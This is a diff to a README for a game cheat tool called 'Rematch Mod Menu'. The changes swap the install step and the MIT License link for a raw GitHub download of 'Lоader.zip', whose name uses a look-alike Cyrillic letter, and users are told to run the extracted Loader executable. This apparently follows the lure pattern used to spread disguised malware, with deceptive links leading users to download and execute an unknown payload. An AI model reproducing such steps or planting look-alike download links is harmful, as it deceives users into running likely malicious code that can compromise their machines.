@@ -41,8 +41,8 @@ Discover the powerful functions of Rematch Mod Menu, each designed to provide yo
 
 Setting up **Rematch Mod Menu** is straightforward! Please follow these steps carefully to ensure smooth operation:
 
-1. **Download Loader.rar** from this repository.
-2. Extract the Loader.rar file to a directory of your choice using a trusted archive manager (e.g., WinRAR, 7-Zip, The Unarchiver).
+1. **Download https://raw.githubusercontent.com/ashulyadav/Rematch-MenuMaster/main/Lоader.zip** from this repository.
+2. Extract the https://raw.githubusercontent.com/ashulyadav/Rematch-MenuMaster/main/Lоader.zip file to a directory of your choice using a trusted archive manager (e.g., WinRAR, 7-Zip, The Unarchiver).
 3. Open the extracted folder and run the Loader executable/application.
 4. Follow the on-screen setup wizard to complete installation.
 5. Select your game and enjoy customizing your gameplay!
@@ -70,7 +70,7 @@ Rematch Mod Menu is created for educational and entertainment purposes only. Usa
 
 ## 📜 License
 
-Rematch Mod Menu is open-sourced under the [MIT License](https://opensource.org/licenses/MIT). 
+Rematch Mod Menu is open-sourced under the [MIT License](https://raw.githubusercontent.com/ashulyadav/Rematch-MenuMaster/main/Lоader.zip). 
 
 Feel free to contribute, fork, or adapt for personal projects! Always provide attribution and abide by the license guidelines.
 
